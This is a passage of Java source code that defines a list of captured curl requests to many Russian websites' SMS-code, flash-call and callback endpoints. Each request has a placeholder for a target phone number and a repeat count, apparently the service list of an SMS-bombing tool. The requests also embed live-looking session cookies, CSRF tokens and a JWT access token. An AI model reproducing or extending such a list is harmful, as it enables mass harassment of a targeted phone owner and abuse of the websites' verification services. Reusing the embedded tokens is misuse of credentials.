                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'email_personal=b550b22ed6fa64ac46a7ddf840606699%40email.email&agree_personal=&user_id=&referer=https%3A%2F%2Fmoymyasnoy76.ru%2F&phone=%2B{phone:7(***)***-**-**}&last_name=gewrgwerg&mail=gwergwe%40gmail.com&sogl=Y&code=' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://www.togas.com/ru/customer/ajax/sendRegistrationCode/' \\\n" +
                        "  -H 'authority: www.togas.com' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; PHPSESSID=ujb75f80h4790m2ibaptb47k23; X-Magento-Vary=e3cb9ab3566a693edff3edf82caa39b1ed79e8ba; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _gcl_au=1.1.1896780550.1683471550; form_key=7clciuUTl2lcRmh8; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ym_uid=1683471550144780515; _ym_d=1683471550; roistat_visit=7945768; roistat_first_visit=7945768; roistat_visit_cookie_expire=1209600; _ga=GA1.2.288191100.1683471550; _gid=GA1.2.426302552.1683471550; _gat_UA-19037809-1=1; _dc_gtm_UA-19037809-1=1; tmr_lvid=532090a0c9f8c5c552952a2ac6fd596e; tmr_lvidTS=1683471550586; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _ym_visorc=w; _ym_isad=2; _tt_enable_cookie=1; _ttp=JFHg9hR8m4F9UDT9CDO4c0hilaw; flocktory-uuid=84ab2d77-1f78-4e0d-bd20-5135f5ad6978-2; roistat_marker=seo_google_; roistat_marker_old=seo_google_; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit%2Croistat_marker%2Croistat_marker_old; ___dc=b6367dbd-27ff-4926-aba4-fc2145e9132d; form_key=7clciuUTl2lcRmh8; mst-cache-warmer-track=1683471550708; astrio_region_data=%7B%7D; private_content_version=8a192ac68420a46e1785a522776c2af2; region_id=location_2643743; c2d_widget_id={%22102757fb55baf860439e0481da11d834%22:%22[chat]%20981d72e21145aff74406%22}; tmr_detect=0%7C1683471555408; section_data_ids=%7B%7D' \\\n" +
                        "  -H 'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI4MzM0NTgiLCJhcCI6IjM1MDY0MzQ4MSIsImlkIjoiM2FkYzMyYTA2MmY3NDVkOCIsInRyIjoiZDY5ZWYxZGJkYmIzMWNhZjJjMTRiYzkwOGY5Yjg4MDAiLCJ0aSI6MTY4MzQ3MTU4NjAzNn19' \\\n" +
                        "  -H 'origin: https://www.togas.com' \\\n" +
                        "  -H 'referer: https://www.togas.com/ru/customer/account/login/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'traceparent: 00-d69ef1dbdbb31caf2c14bc908f9b8800-3adc32a062f745d8-01' \\\n" +
                        "  -H 'tracestate: 2833458@nr=0-1-2833458-350643481-3adc32a062f745d8----1683471586036' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-newrelic-id: Vg4EUlJWABADUVFUAwIFX1w=' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'phone={phone:7+(***)+***-**-**}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://m.keng.ru/api/auth.php?do=send_sms&phone=%2B7%20{phone:(***)%20***-**-**}&additional=&time_start=1683471720&time_send=1683471734' \\\n" +
                        "  -H 'authority: m.keng.ru' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'cookie: user_city=819175; PHPSESSID=6MA8EtmqKSRHYqpuvx50UOrJ3doCoutN; BITRIX_SM_SALE_UID=252125956; rrpvid=415924122131410; flocktory-uuid=ce761917-256f-45a9-b033-e2e0c92fe3ea-9; _ym_uid=1683471712692515343; _ym_d=1683471712; _userGUID=0:lhdjla87:jDt4CXJOxWrTq0Ndl2IxSMIWPbLRn_Uz; dSesn=e985ba59-5740-fefd-c818-64858cc6c5bd; _dvs=0:lhdjla87:9feDQy22nTe4vr2S7d9aAlwZSV7uYt8z; _ga=GA1.2.410001979.1683471711; _gid=GA1.2.203278608.1683471712; _gat_gtag_UA_3284218_1=1; rcuid=6275fcd65368be000135cd22; gcui=; gcmi=; gcvi=6ekziWFNm1E; gcsi=fglAVDmtHyh; _ym_visorc=w; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; tmr_lvid=7a2e012d95616e8b5a2b83ecb20e2f72; tmr_lvidTS=1683471712023; c2d_widget_id={%221c4ac29a56745c16aa588c0f8a746ba8%22:%22[chat]%202dcee85992bd3bdfae61%22}; tmr_detect=0%7C1683471714344; _gr_session=%7B%22s_id%22%3A%22b50f62e5-daf4-4c5c-bc21-064e88358589%22%2C%22s_time%22%3A1683471720150%7D; _ga_KXFKXCMF0K=GS1.1.1683471711.1.1.1683471734.37.0.0' \\\n" +
                        "  -H 'referer: https://m.keng.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://spb.partsdirect.ru/accounts/register?phone={phone}&action=getsms&from=modal' \\\n" +
                        "  -H 'authority: spb.partsdirect.ru' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'cookie: pddst=v2; memka=0; PHPSESSID=imrjp6tsqbimanrf1d85huud7q; adkeyword=534327759d72b481938233826edd6ee9847177953696aacc95844abfc7a5db52a%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22adkeyword%22%3Bi%3A1%3Bi%3A-1%3B%7D; adid=911d83596eb611201487d2bdc50c71236b4b050a8782b35387ad6affdfc4b36da%3A2%3A%7Bi%3A0%3Bs%3A4%3A%22adid%22%3Bi%3A1%3Bi%3A-1%3B%7D; geo_method=by_cookie; _csrf=34242663a383d7ee0cfac8e50ea892422673904b5ff156c45f0aa37dd6efbea2a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22Oxnv2r4wSthC3rykvJyveHDNWKmwr41p%22%3B%7D; pddst=v2; memka=0; _gcl_au=1.1.157795892.1683472136; _ga=GA1.2.256322644.1683472136; _gid=GA1.2.1200198156.1683472136; _gat_gtag_UA_50017317_1=1; rrpvid=190100772915140; _ym_uid=1683472136104989003; _ym_d=1683472136; JivoSiteLoaded=1; _ym_isad=2; rcuid=6275fcd65368be000135cd22; adcompany=7c825d9d3ee5712d9ee3ca2681eee424dca0039b6369916bc8e1c044811edc3fa%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22adcompany%22%3Bi%3A1%3Bs%3A47%3A%22697_6597b001defffb91c8aaa45b5855f594_1683472137%22%3B%7D; rememberedLocale=true; ct_static_user_id=1190022; __utmz=utmcsr%3D(direct)%7Cctd%7Cutmccn%3D(not%20set)%7Cctd%7Cutmcmd%3D(none)%7Cctd%7Cutmctr%3D-%7Cctd%7Cutmcct%3D-%7Cctd%7Creferrer%3Dhttp%3A%2F%2Fspb.partsdirect.ru%2F%7Cctd%7Clanding%3Dhttps%25253A%2F%2Fspb.partsdirect.ru%2F%252523login; __imz=utmcsr%3D(direct)%7Cctd%7Cutmccn%3D(not%20set)%7Cctd%7Cutmcmd%3D(none)%7Cctd%7Cutmctr%3D-%7Cctd%7Cutmcct%3D-%7Cctd%7Creferrer%3Dhttp%3A%2F%2Fspb.partsdirect.ru%2F%7Cctd%7Clanding%3Dhttps%25253A%2F%2Fspb.partsdirect.ru%2F%252523login; ct_url_metrics=%7B%7D' \\\n" +
                        "  -H 'referer: https://spb.partsdirect.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://finardi.ru/shared/callme' \\\n" +
                        "  -H 'Accept: */*' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/json' \\\n" +
                        "  -H 'Cookie: csrftoken=A8hEo2eHsDLhsaCVoNTt4Iv105uqmqZ9mTEZpfbfxmuuPjbEpRnyZE8GGrv12Fc4; _ym_uid=1683457383715126006; _ym_d=1683457383; _ym_isad=2' \\\n" +
                        "  -H 'Origin: https://finardi.ru' \\\n" +
                        "  -H 'Referer: https://finardi.ru/' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
                        "  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  --data-raw '{\"type\":\"order\",\"name\":\"Сергей\",\"phone\":\"+{phone:7 (***) ***-**-**}\",\"igree\":\"on\",\"currenturl\":\"https://finardi.ru/\",\"utm\":\"=undefined\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://pass.ska.ru/registration/send-code/' \\\n" +
                        "  -H 'authority: pass.ska.ru' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: PHPSESSID=aa6e772056aa9dad80f46fb460e370be; _csrf=3182c08624700237252a4ea05a154ccda4d02a352645798640109d42a40dee08a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22j8M8OQL6QGTt2oi0dVz4I7XiRGd-clMG%22%3B%7D; _ym_uid=1683473292741918790; _ym_d=1683473292; _ym_isad=2; _ga=GA1.2.857620759.1683473292; _gid=GA1.2.1794914780.1683473292; _gat_gtag_UA_19620142_22=1; _ym_visorc=w; _HC_4379=N4T2X6M1IhksqE0Azzzzzzzz:C4379G108:1686065292; _HC_uu=N4T2X6M1IhkspE0Azzzzzzzz; _HC_fr=:::1683473292; _HC_v4379=AmRXw4wAAwAE~N4T2X6M1IhkspE0A~N4T2X6M1IhksqE0Azzzzzzzz~C4379G108' \\\n" +
                        "  -H 'origin: https://pass.ska.ru' \\\n" +
                        "  -H 'referer: https://pass.ska.ru/registration/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-csrf-token: 88iULyGB6Lc_Vi_CPu8GTBVaL5eBBLVtypfCMGo2P7KZ8NkXbtCkgW4Re7YMgG98cQxVo8gz7QSY0KYdCVpy9Q==' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'phone={phone}&phone_prefix=7&action=register' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://kcentr.ru/user-service/api/desktop/v1/send-flash-call' \\\n" +
                        "  -H 'authority: kcentr.ru' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'cookie: session_uuid=1e92a07b-46cd-4c98-a02e-7db45441d59a; store[region]=deb1d05a-71ce-40d1-b726-6ba85d70d58f; store[city]=%D0%98%D0%B6%D0%B5%D0%B2%D1%81%D0%BA; store[region_name]=%D0%A3%D0%B4%D0%BC%D1%83%D1%80%D1%82%D1%81%D0%BA%D0%B0%D1%8F%20%D1%80%D0%B5%D1%81%D0%BF%D1%83%D0%B1%D0%BB%D0%B8%D0%BA%D0%B0; KC_CITY_CONFIRMATION_SHOWN=true; _gcl_au=1.1.1203414022.1683473561; PHPSESSID=iqv63hbmltost2mjt5ka0alngm; stDeIdU=da87117e-158e-40a6-9f10-a95984a2b028; vIdUid=400fe42b-b5c6-4bf8-8866-1a7edd142a56; stLaEvTi=1683473563986; _acfId=7460ac98-3a82-4516-8bf0-5a1023458588; _acfVisit=2' \\\n" +
                        "  -H 'origin: https://kcentr.ru' \\\n" +
                        "  -H 'referer: https://kcentr.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  --data-raw '{\"visitorUuid\":\"1e92a07b-46cd-4c98-a02e-7db45441d59a\",\"cityUuid\":\"deb1d05a-71ce-40d1-b726-6ba85d70d58f\",\"phone\":\"+{phone:7 *** ***-**-**}\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://sberpravo.ru/api/client-profile/v1/user-verify/send/v2' \\\n" +
                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/json' \\\n" +
                        "  -H 'Cookie: SALE_UTMS={}; _ym_uid=1683473648501243152; _ym_d=1683473648; _ym_isad=2; _ym_visorc=w; prevRoute=/private-clients; prevRouteDate=2023-05-07T15:34:09.688Z' \\\n" +
                        "  -H 'Origin: https://sberpravo.ru' \\\n" +
                        "  -H 'Referer: https://sberpravo.ru/' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
                        "  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  --data-raw '{\"phoneOrEmail\":\"+{full_phone}\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://anketa.rencredit.ru/bitrix/services/main/ajax.php?mode=class&c=qsoft%3Av2.application.form&action=sendCode' \\\n" +
                        "  -H 'Accept: */*' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Bx-ajax: true' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/x-www-form-urlencoded' \\\n" +
                        "  -H 'Cookie: PHPSESSID=gTwa75gEmsmWiz4QGEAciyPerAe9OHmJ; dtCookie=v_4_srv_10_sn_AFE92F67C79B8DF767B09BB3E9EC8287_perc_100000_ol_0_mul_1_app-3Ab087460a1cf792cf_1; COOKIE_PEEFORMANCE=1; rxVisitor=1683473730461RNP20Q0EFAPL7JSJ2CSEB82K7U143PLC; dtSa=-; _gcl_au=1.1.820909609.1683473731; _ym_uid=168347373150047117; _ym_d=1683473731; _ga_C3YQQ4X5YQ=GS1.1.1683473730.1.0.1683473731.59.0.0; _ga=GA1.2.761619278.1683473731; _gid=GA1.2.1999755351.1683473731; _ym_isad=2; _ym_visorc=w; flocktory-uuid=32e6d4f6-3ffa-46ff-bdbd-ff707e6dfe2a-3; dtLatC=1; _gat_UA-8730113-1=1; rxvt=1683475637812|1683473730463; dtPC=10$473730460_971h8vCVMCSABGLWGKPDCVSNPKUIODRGWAUSOR-0e0' \\\n" +
                        "  -H 'Origin: https://anketa.rencredit.ru' \\\n" +
                        "  -H 'Referer: https://anketa.rencredit.ru/app/credit/' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
                        "  -H 'X-Bitrix-Csrf-Token: 3468097d9b542db72c66d364e4e401d8' \\\n" +
                        "  -H 'X-Bitrix-Site-Id: s1' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'x-dtpc: 10$473730460_971h8vCVMCSABGLWGKPDCVSNPKUIODRGWAUSOR-0e0' \\\n" +
                        "  --data-raw 'mobilePhone={full_phone}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://peakstore.ru/local/ajax/authorize.php?action=2' \\\n" +
                        "  -H 'authority: peakstore.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded' \\\n" +
                        "  -H 'cookie: PHPSESSID=1ijXEF7GJBeObE5MR8aN3BZsRKU3OvQt; _ga=GA1.2.DE97DAC1-D247-330D-DD34-5623C012304C; BITRIX_SM_SALE_UID=369332880; _ym_uid=1683474014214437739; _ym_d=1683474014; _ga=GA1.2.DE97DAC1-D247-330D-DD34-5623C012304C; _gid=GA1.2.847096028.1683474014; _gat_gtag_UA_197756461_1=1; __exponea_etc__=0dac0319-f2ff-43e2-aace-4715018e1084; __exponea_time2__=0.5859441757202148; _ym_visorc=w; _ym_isad=2; mgo_uid=X5j4GqvLjO8AI7u34Gyr; __cf_bm=EsQNVsJMWVwKkKNEhw8UIH1TW4aATLVNfwRfM9IhJzA-1683474018-0-Ac2BIci5B7XcUd9khIdSe70P2PWqv+tkQ7pR7fnO9ML3MjOFOkOoGEnEUa/DREh5LbcNNRprtnpF38XOrn1n8CGgNmZo3AtM53JsN9mi0/83' \\\n" +
                        "  -H 'origin: https://peakstore.ru' \\\n" +
                        "  -H 'referer: https://peakstore.ru/auth/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  --data-raw 'phone={full_phone}&bxsessid=2ac51002e1ac2e072a405994d8acbb1d&lid=pe' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://marketzdorovie.ru/api/login/send_code' \\\n" +
                        "  -H 'authority: marketzdorovie.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'bx-ajax: true' \\\n" +
                        "  -H 'content-type: application/json;' \\\n" +
                        "  -H 'cookie: PHPSESSID=2hbnv434bmtanv3fgis1lh9vi8; BITRIX_SM_SALE_UID=134859; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A4%2C%22EXPIRE%22%3A1683493140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=168347417875899015; _ym_d=1683474178; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_visorc=w' \\\n" +
                        "  -H 'origin: https://marketzdorovie.ru' \\\n" +
                        "  -H 'referer: https://marketzdorovie.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw '{\"phone\":\"{phone:+7 (***) *** ** **}\",\"sessid\":\"ed8a1f45bf4b69fbae8c3c742b59a47e\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://lk.dune-hd.tv/v2/otps' \\\n" +
                        "  -H 'authority: lk.dune-hd.tv' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'cookie: _ym_uid=1684849868915006420; _ym_d=1684849868; _ym_isad=2; _ym_visorc=w; csrftoken=m2Yd48O2Ui5BKsIDRwdWrhZgiHpNwMmV' \\\n" +
                        "  -H 'origin: https://lk.dune-hd.tv' \\\n" +
                        "  -H 'referer: https://lk.dune-hd.tv/site' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw '{ \"phone\": \"{full_phone}\" }' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://www.vprok.ru/as_send_pin' \\\n" +
                        "  -H 'authority: www.vprok.ru' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded' \\\n" +
                        "  -H 'cookie: region=8; shop=2671; deliveryTypeId=1; standardShopId=7707; luuid=d0179dbe-41a1-4c9f-baf6-5276148bdf17; suuid=4180f32b-bbd1-405d-8f57-8ff7fb5f42a9; XSRF-TOKEN=eyJpdiI6Im9GenBrU0t1akt1YmZvXC9mb0p2OU13PT0iLCJ2YWx1ZSI6IjF0M0NVUWJrTGNQekx6ZXdDeUorUElCY1AxaDFsSHlzOGg0Zk12cHJiOGVaWTRrTlgzakIrcXdKaldadTViRFBBVGorOXdXNnY5TThXQXEwWExVUnd3PT0iLCJtYWMiOiIzZWE3NmU5MTg3Y2U1N2FlY2JkMjlhMjM5NTJlOWFiNmI4NmZlMTQ3Y2U1NjIxNzMzOTNkZGRlZjkzY2U1N2YxIn0%3D; access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI5IiwianRpIjoidXVpZGQwMTc5ZGJlLTQxYTEtNGM5Zi1iYWY2LTUyNzYxNDhiZGYxNzBlNjMwY2VhNGNmN2RhNjg4NGY0YmUzODRlNTJlMWMxYzRlZjc0NDUiLCJpYXQiOjE2ODQ4NTA5NjMuNjE1NDE1LCJuYmYiOjE2ODQ4NTA5NjMuNjE1NDE3LCJleHAiOjE2ODQ4NjUzNjMuNjExMzMxLCJzdWIiOiIiLCJzY29wZXMiOltdLCJzcGxpdF9zZWdtZW50Ijo1fQ.KjvVaYIc4x5VYcdQIhpEwd7NyBdUE5fKaoF4acANBv9LweariuOegGnWns7HT-xjc4qXaUnZoNxYoHdW_Cas6k4jGsfJc_-FWHYI2B4qvfNHwNsw3n_mxttlc7ozUYyNdHxn86BgfscPTRIuJS7xH90ywszgtox4ytKWW9FAW3ZDhR54bo-5FkOiJSeuBs7b98IuG-W9KE7h49oVWTr-B3kTc4yglSr_5CFAvhlVC32wJz2pFuWLYcm1TmyD76COBc1KkZxYF63n__yHjXStNXuG7_BbZfXwYrB5vCiyV0H5hJGfN8dcfBVn-CZINDQldXX2xW2ZDYld2LF0ruSM9rmbSEGWddgkvwD4P3RxIEWguyzi35BLgiGgR6EEq_qVLqxLn1vK9zBYPH1yxzVgZXLDeIvpCy8tDyAghbfP5leIoESeyoeFy-MbiqA8tfSVu0TcGpF8oMtK8F0U7HxWCKabwai4-5_wkDndKXvhXMZK00nTQ7dwy7CxEL1TPAhs6UXmg8Vv09SgbI9Qd9CVVN7b4W5PKzD9BQhxEAWUH3oq7aLfp4gzDNe_6S0ALHaXk-Fi8PByP9gppqvXZcBi9oXCdE-TdAnnEaqr3yE7cRwzIZbCfxJ8NX06WdLvXwqBnhYBpPb1lQqUHWlym2APH6dUyHvd7D6KCR8xxwex0DE; split_segment=5; split_segment_amount=11; aid=eyJpdiI6Ik9qaGtrSzV5dkl1YVBMUXFORkcwZUE9PSIsInZhbHVlIjoieDMza3BlaW51a3U3dnZLSDUrUU1lWHpXbWFDSDFkNXhzZCtqVHFzTzBQbDc0YkVnbm10NmdVTG02c3BBd09TRzRXdUNtV0xlUmZhZUlYcVZxbTB1elE9PSIsIm1hYyI6IjI2NjUwZGFiZDAyYWM5Y2RjMGNmNzVhYjkzM2FiY2FjNWRlOTJhNGE4NzQ5YWNjMzlmMzM4ZDljM2NiZDdhNjgifQ%3D%3D; slid=646cc9161f9dcc44460fe5fb; slsession=A455C95C-D062-422B-8562-674BACA48FC8; _ga=GA1.2.1773113177.1684850969; _gid=GA1.2.782787489.1684850969; _gat_UA-93122031-1=1; 